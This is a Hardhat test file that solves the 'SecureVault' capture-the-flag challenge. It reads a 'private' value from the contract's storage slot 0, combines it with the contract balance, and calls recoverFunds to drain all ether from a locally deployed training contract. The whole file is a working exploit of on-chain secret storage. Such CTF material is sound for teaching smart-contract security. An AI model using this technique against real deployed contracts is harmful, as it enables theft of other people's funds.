const { expect } = require('chai');
const { ethers } = require('hardhat');

// run the test
// npx hardhat test ./test/N1-SecureVault-easy.js
describe('CTF #1 SecureVault', function () {
  let challengeInstance, deployer;

  before(async function () {
    [deployer] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory('N1SecureVault');
    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') });
    await challengeInstance.deployed();
  });

  it('Should recover all funds', async function () {
    let slot = await ethers.provider.getStorageAt(challengeInstance.address, 0);
    slot = ethers.BigNumber.from(slot);
    
    let _balance = await ethers.provider.getBalance(challengeInstance.address);
    _balance = ethers.BigNumber.from(_balance);
    _balance = _balance.add(ethers.utils.parseEther('0.0001'));
    
    let hash = ethers.utils.solidityKeccak256(["uint256", "uint256"], [slot, _balance]);
    
    await challengeInstance.recoverFunds(hash, { value: ethers.utils.parseEther('0.0001') });
    
    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0');
  });
});
